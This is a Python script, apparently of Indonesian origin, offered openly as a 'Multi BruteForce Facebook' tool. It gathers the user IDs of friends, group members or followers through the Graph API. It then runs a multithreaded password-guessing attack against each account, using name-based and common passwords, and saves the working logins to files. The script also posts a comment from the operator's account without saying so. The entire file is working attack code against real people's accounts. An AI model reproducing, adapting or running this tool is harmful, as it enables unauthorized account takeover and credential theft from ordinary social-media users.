#!/usr/bin/python3.7
# -*- Coding: utf-8 -*-
# Credits   : DulLah
# Updater   : KMB.ID ( L4.ERORR )
# Copyright : © 2019

## USE PYTHON VERSI 3 ##

import os, sys, requests, hashlib
from time import sleep
from getpass import getpass
try:
	import requests
except ImportError:
	os.system("pip3 install requests")
from requests.exceptions import ConnectionError
from multiprocessing.pool import ThreadPool

s = requests.Session()
url = "https://graph.facebook.com/{}"
api="https://api.facebook.com/{}"

### Animasi gerak
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		sleep(0.02)

target = []
found = []
checkpoint = []

### WARNA
R = "\033[1;91m"
G= "\033[1;92m"
Y = "\033[1;93m"
B = "\033[1;94m"
P = "\033[1;95m"
C = "\033[1;96m"
W = "\033[1;97m"
GB = "\033[1;42m"
PM = "\033[3;95m"
CM = "\033[3;96m"
RM = "\033[3;91m"
RE = "\033[0m"
CR = "\033[1;41;96m"

### LOGO L4
logo_4 = """\x1b[00m\x1b[96m
 ╔══════════════════════════════╦════════════════╗
 ║ \x1b[1;91m╦ ╦ ╦   ╔═╗ ╔═╗ ╔═╗ ╔═╗ ╔═╗  \x1b[1;96m║\x1b[41;92m    KMB • ID    \x1b[0m\x1b[1;96m║
 ║ \x1b[1;91m║ ╚-╣ • ╠╣  ║   ║   ║ ║ ║    \x1b[1;96m╠\x1b[41;96m════🛡️══════🛡️════\x1b[0m\x1b[96m╣
 ║ \x1b[1;97m╩╝  ╩   ╚═╝ ╩   ╩   ╚═╝ ╩ \x1b[93m404\x1b[1;96m║\x1b[1;47;91m© \x1b[94mcopyright \x1b[95m2019\x1b[0m\x1b[1;96m║
 ╚══════════════════════════════╩════════════════╝"""

### Siapa Kamu ###
def siapa():
	os.system('clear')
	print(logo_4)
	print ('''\x1b[00m     ▓▀██      ▒█████    ▄████  ▀▀▓ ███▄   ▀█▓
      ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █▓
      ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒
      ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒
      ░█▄▄██▀▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░
      ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒
      ░ ░\x1b[00m\033[3;93;41m C R E A T E  U S E R  L O G I N \033[00m\x1b[1;00m░ ░
        ░ ░   ░   ░    ░ ░   ░    ░   ░   ░
         ▒     ░        ░        ░       ▒''')
	nama = input("\x1b[96m╔═════▶\033[1;93m Isi Data Konfirmasi Nama Anda !!!\n\x1b[96m╚══▶ \x1b[1;94mNick \x1b[1;91m|\x1b[1;94m Name \033[1;91m: \033[1;92m")
	if nama =="":
		print("\033[1;96m[!] \033[1;91mIsi yang benar")
		sleep(1)
		siapa()
	else:
		os.system('clear')
		jalan("\033[1;93m              Selamat datang \033[1;92mMR." +nama+ " \n\033[1;93m⏩ Terimakasih telah menggunakan tools ini !! ⏪\n      👹👹 Enjoy in your life \x1b[1;92mMR."+nama +" 👹👹\n          \x1b[1;97mContact person : \x1b[1;96m+6288217145014\n\x1b[1;41;94m💰 NOOBY TEAM INDONESIA ,\x1b[1;47;91m KMB • ID {L4•ERROR} 💰\x1b[0m")
		sleep(2)
		cek()

### LOGO HOME
def banner():
	os.system("clear")
	print("""\033[1;96m     _____________________________/\.\033[1;91mM \033[1;93mB \033[1;92mF\033[1;97m_\033[1;95mNEWS
\033[1;96m    / `---`___________----_______/--] \033[1;91m• • •\033[1;97m ░▒▓D 
\033[1;96m   /_|;;;;;;;;;|_________.:/ \033[1;93mPrograme \033[1;97mPython \033[1;97m3.7
\033[1;96m    ), ---.( \( ) / \033[1;91m╔══════════════════════════╗
\033[1;96m   // (..)),,----`  \033[1;91m║\033[1;97m Autor:\033[1;92m KMB.ID \033[1;93m☆ \033[1;91mL4.\033[1;96mERROR \033[1;91m║
\033[1;96m  //___//           \033[1;91m║\033[1;97m Feat :\033[1;94m    \x1b[94mUn1ker5 \033[1;95m71     \033[1;91m║
\033[1;96m //___//            \033[1;91m╚══════════════════════════╝
\033[1;96m ╚═════╝\033[1;91m[\033[1;93mUPDATE\033[1;91m] \033[1;94mMulti \033[1;92mBruteForce \033[1;91mFacebook \033[1;97mV\033[1;97m91""") 
### CEK token
def cek():
	global toket
	os.system('clear')
	banner()
	print (48*"\x1b[1;92m═")
	print("\033[1;95m[√]\033[1;97m Loading access token")
	sleep(2)
	try:
		os.mkdir("cookie")
	except:
		pass
	try:
		toket = open("cookie/token.log","r").read()
	except OSError:
		print("\033[1;95m[X]\033[1;97m Ups sorry token not found !!")
		sleep(2)
		login()
	try:
		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
		id = s.get(url.format("me?access_token=%s"%(toket))).json()["id"]
		sub = s.get(url.format("me/subscribers?access_token=%s"%(toket))).json()["data"]
		s.post(url.format("me/comments?message=id&access_token=%s"%(toket)))
		print("\033[1;95m[√]\033[1;92m Success\033[1;97m load access token")
		sleep(1)
		menu(n,id,toket)
	except KeyError:
		os.system("rm -rf cookie/token.log")
		print("\033[1;91m[?]\033[1;97m Ups sorry your access token invalid !!")
		sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print("\033[1;91m[!]\033[1;97m Ups no connection !!")
		
		
### LOGIN
def login():
	os.system('clear')
	banner()
	print ('\x1b[1;47;94m Login dulu di \x1b[1;41;93m Operamini \x1b[1;47;94mAgar tidak\x1b[1;41;93m Checkpoint \x1b[0m')
	email = input("\033[1;95m[✓] \033[1;97mID \033[1;91m/ \033[1;97mEmail   \033[1;91m:\033[1;92m ")
	pasw = input("\033[1;95m[✓] \033[1;97mPassword     \033[1;91m:\033[1;92m ")
	get(email,pasw)
	
### ACCESS TOKEN
def get(email,pasw):
	jalan("\033[1;95m[*]\033[1;97m Loading      \033[1;91m: \033[1;97m... ... ... ")
	b = open("cookie/token.log","w")
	try:
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pasw,"return_ssl_resources":"0","v":"1.0"}
		x = hashlib.new('md5')
		x.update(sig.encode("utf-8"))
		data.update({'sig':x.hexdigest()})
		ok=s.get(api.format("restserver.php"),params=data).json()
		if "access_token" in ok:
			b.write(ok["access_token"])
			b.close()
			print("\033[1;95m[*]\033[1;97m Access token \033[1;91m: \033[1;92mSuccessfully ")
			exit("\033[1;95m[+]\033[1;97m Saved in     \033[1;91m: \033[1;93mcookie/token.log")
		elif "www.facebook.com" in ok["error_msg"]:
			os.system("rm -rf cookie")
			print("\033[1;95m[×]\033[1;91m Failed \033[1;97mto generate access token !!")
			exit("\033[1;95m[!] \033[1;97mYour account \033[1;93mcheckpoint !!")
		else:
			os.system("rm -rf cookie")
			print("\033[1;95m[×]\033[1;91m Failed \033[1;97mto generate access token !!")
			exit("\033[1;95m[!] \033[1;97mWrong email or password !!")
	except requests.exceptions.ConnectionError:
		print("\033[1;95m[ × ]\033[1;91m failed \033[1;97mto generate access token !!")
		exit("\033[1;91m[ ! ] \033[1;97mcheck your connection !!")
		
### MENU
def menu(n,id,toket):
	global token
	global loop
	loop=0
	os.system('clear')
	banner()
	print("\x1b[1;92m╔"+46*"═"+"╗")
	print("\x1b[1;92m║  \x1b[1;94m(((\x1b[1;91m●\x1b[1;94m))) \x1b[4;97mSelamat datang, Saudara(\x1b[91mi\x1b[97m)\033[0m \x1b[1;94m(((\x1b[1;91m●\x1b[1;94m)))  \x1b[1;92m║")
	print("\x1b[1;92m║        \x1b[1;96mUser \x1b[1;91m: \033[1;93m"+ n + (31 - len(n)) * "\x1b[1;92m " + "║")
	print("\x1b[1;92m║        \x1b[1;96mID   \x1b[1;91m: \033[1;93m"+ id + (31 - len(id)) * "\x1b[1;92m " + "║")
	print("\x1b[1;92m╠"+16*"═"+"\x1b[1;91m❴\x1b[3;4;97m MENU TOOLS \x1b[0m\x1b[1;91m❵\x1b[1;96m"+16*"═"+"╝")
	jalan("""\033[1;92m╠══▶ \033[1;93m[\033[1;95m01\033[1;93m] \033[2;3;4;97mCrack From Friend\033[0m 
\033[1;92m╠══▶ \033[1;93m[\033[1;95m02\033[1;93m] \033[2;3;4;97mCrack From List Friends to Friend\033[0m
\033[1;92m╠══▶ \033[1;93m[\033[1;95m03\033[1;93m] \033[2;3;4;97mCrack From Group\033[0m
\033[1;92m╠══▶ \033[1;93m[\033[1;95m04\033[1;93m] \033[2;3;4;97mCrack From Request Friend\033[0m\x1b[92m(Follower)
\033[1;92m╠══▶ \033[1;93m[\033[1;95m05\033[1;93m] \033[2;3;4;97mCrack From Friend\033[0m \x1b[92m(Target)
\033[1;92m╠══▶ \033[1;93m[\033[1;93m06\033[1;93m] \033[2;3;4;97mTools Profile Guard FB🛡️
\033[1;92m║
\033[1;92m╠══▶ \033[1;93m[\033[1;95m00\033[1;93m] \033[2;3;4;91mLog out account\033[0m
\033[1;92m╠══▶ \033[1;93m[\033[1;95m99\033[1;93m] \033[2;3;4;93mExit\033[0m 
\033[1;92m║
\033[1;92m╠══════╦\033[1;91m[\033[1;97m Input  number \033[1;91m]\033[1;92m╗""") 
	kmb = input("\033[1;92m╚══════╩══\033[1;91m[ \033[1;3;96mL4.ERROR\033[0m\033[1;91m ]\033[1;92m═══╩══════\033[1;91m▶\033[1;95m ") 
	if kmb =="":
		exit("\033[1;95m[!] \033[1;97mWrong Input !! ")
		
	elif kmb =="1" or  kmb =="01":
		os.system('clear')
		banner()
		print (48*"\x1b[1;92m═")
		print("\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;93mFrom your friend")
		print("\033[1;95m[\033[1;97m+\033[1;95m] \x1b[97mUsername \x1b[91m:\x1b[92m "+n)
		for z in s.get(url.format("me/friends?access_token=%s"%(toket))).json()["data"]:
			target.append(z["id"])
			
	elif kmb =="2" or kmb=="02":
		os.system('clear')
		banner()
		print (48*"\x1b[1;92m═")
		print("\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;93mFrom Friend to list Friends")
		try:
			idf = input("\033[1;95m[\033[1;97m+\033[1;95m] \x1b[97mID friend \x1b[91m:\x1b[92m ")
			k = s.get(url.format(idf+"?access_token=%s"%(toket))).json()["name"]
		except KeyError:
			exit("%s[!]%s ups sorry friend not found !!"%(R,W))
		print("\033[1;95m[\033[1;97m+\033[1;95m] \x1b[92mfrom \x1b[91m:\x1b[97m "+k)
		for f in s.get(url.format(idf+"/friends?access_token=%s"%(toket))).json()["data"]:
			target.append(f["id"])
			
	elif kmb =="3" or kmb =="03":
		os.system('clear')
		banner()
		print(48*"\x1b[1;92m═")
		print("\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;93mFrom Member Grup")
		try:
			idg = input("\n\033[1;91m[+] \033[1;92m ID group \033[1;91m: \033[1;97m ")
			g = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket))).json()["name"]
		except KeyError:
			exit("\033[1;95m[\033[1;91m!\033[1;95m] \x1b[93mUps sorry group not found !!")
		print("\033[1;95m[\033[1;97m+\033[1;95m] \x1b[92mfrom \x1b[91m:\x1b[97m "+g)
		for y in s.get(url.format(idg+"/members?fields=name,id&start=0&listType=list_invited&limit=99999999&access_token=%s"%(toket))).json()["data"]:
			target.append(y["id"])
			
	elif kmb =="4" or kmb =="04":
		os.system('clear')
		banner()
		print(48*"\x1b[1;92m═")
		print("\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;93mFrom Follower")
		print("\033[1;95m[\033[1;97m+\033[1;95m] \x1b[92mUsername \x1b[91m:\x1b[97m "+n)
		for sub in s.get(url.format("me/subscribers?fields=name,id&limit=99999999&access_token=%s"%(toket))).json()["data"]:
			target.append(sub["id"])
			
	elif kmb =="5" or kmb =="05":
		os.system('clear')
		banner()
		print("\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!") 
		print(48*"\x1b[1;92m═")
		print("\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;93mFrom Friends Target")
		try:
			idt = input("\x1b[1;95m[\x1b[1;92m*\x1b[1;95m]\x1b[1;92m Target ID \033[1;91m:\033[1;97m ")
			t = s.get(url.format(idt+"?access_token=%s"%(toket))).json()["name"]
		except KeyError:
			exit("\x1b[1;95m[\x1b[1;91m!\x1b[1;95m]\x1b[1;97m Ups sorry friend not found !!")
		print("\x1b[1;95m[\x1b[1;92m*\x1b[1;95m]\x1b[1;92m Name Target\x1b[1;91m : \x1b[1;91m"+t)
		for tr in s.get(url.format(idt+"/friends?access_token=%s"%(toket))).json()["data"]:
			target.append(tr["id"])
			
	elif kmb =="6" or kmb =="06":
		guard()
		
	elif kmb =="0" or kmb =="00":
		os.system("rm -rf cookie")
		cek()
		
	elif kmb == ["99"]:
		os.system("clear")
		os.system("exit")
	else:
		print("\x1b[1;95m[\x1b[1;91m!\x1b[1;95m]\x1b[1;91m wrong input !!")
		os.system('clear')
		menu(n,id,toket)
		
	print
	jalan("""\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;92mScaning ....""") 
	print("\033[1;95m[\033[1;97m?\033[1;95m] \033[1;92mPlease wait \033[1;91m. . . . ") 
	print("\033[1;95m[\033[1;97m✸\033[1;95m] \033[1;92mCrack \033[1;97m... ... ... ") 
	
	m = ThreadPool(30)
	m.map(x,target)
	result(found,checkpoint)
	print("\x1b[1;95m[+] \x1b[1;92mDone ... ")
	input("\n\033[1;96m[\033[1;97mEnter => Kembali\033[1;96m]")
	menu(n,id,toket)
	
### EXSKUSI CRACK
def x(user):
	global loop
	global token
	try:
		os.mkdir("hasil")
	except:
		pass
	try:
		fn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
		mn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["middle_name"]
		ln = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Bacot","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123"]:
			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				open("hasil/ok.txt","a").write("%s | %s\n"%(user,pas))
				found.append("%s | %s"%(user,pas))
			elif "www.facebook.com" in p["error_msg"]:
				open("hasil/cp.txt","a").write("%s | %s\n"%(user,pas))
				checkpoint.append("%s | %s"%(user,pas))
		loop+=1
		print("\r%s[%s%s%s]%s CP %s%s%s/%s%s %sOK %s[%s%s%s]%s   "%(P,Y,len(checkpoint),P,W,R,loop,W,B,len(target),W,P,G,len(found)),P,end=""),;sys.stdout.flush()
	except:pass
		
### HASIL CRACK
def result(found,checkpoint):
	if len(found) !=0:
		print("\n%s[%s] %sfound%s >"%(G,len(found),W,R))
		for i in found:
			print("%s###%s %s"%(G,W,i))
		print("\n\x1b[1;95m[\x1b[1;92m+\x1b[1;95m]\x1b[1;97m file saved \x1b[91m: \x1b[94mhasil\x1b[91m/\x1b[92mok.txt")
	if len(checkpoint) !=0:
		print("\n%s[%s] %scheckpoint%s >"%(Y,len(checkpoint),W,R))
		for i in checkpoint:
			print("%s###%s %s"%(Y,W,i))
		print("\n\x1b[1;95m[\x1b[1;92m+\x1b[1;95m]\x1b[1;97m file saved \x1b[91m: \x1b[94mhasil\x1b[91m/\x1b[93mcp.txt")
	if len(found)==0 and len(checkpoint)==0:
		print("\n\x1b[1;96m[\x1b[1;92m!\x1b[1;96m]\x1b[1;97m No result found :'(")
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system('clear')
	try:
		toket = open("cookie/token.log","r").read()
	except IOError:
		print ("\033[1;91m[!] Token not found")
		os.system("rm -rf cookie/token.log")
		sleep(1)
		login()
	os.system('clear')
	benner()
	print("\x1b[1;92m╔"+47*"═")
	print ("\x1b[96m╠▶\033[1;93m[ \033[1;97m1 \033[1;93m]\033[1;97m Activate")
	print ("\x1b[96m╠▶\033[1;93m[ \033[1;97m2 \033[1;93m]\033[1;97m Not activate")
	print ("\x1b[96m╠▶\033[1;93m[ \033[1;91m0 \033[1;93m]\033[1;97m Back")
	print ("\x1b[96m║")
	g = input("\x1b[96m╚▶\033[1;41;96m KMB•ID \x1b[0;0m\033[1;97m>>> ")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		menu(n,id,toket)
	elif g =="":
		guard()
	else:
		print ("\x1b[91mSALAH !!!")
		exit()
##1
def get_userid(toket):
	url = ("https://graph.facebook.com/me?access_token=%s"%toket)
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
	
###2
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print (res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print(logo_4)
		print ("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate")
		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu(n,id,toket)
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print(logo_4)
		print ("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate")
		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu(n,id,toket)
	else:
		print ("\033[1;91m[!] Error")
		exit()

if __name__ == '__main__':
	siapa()
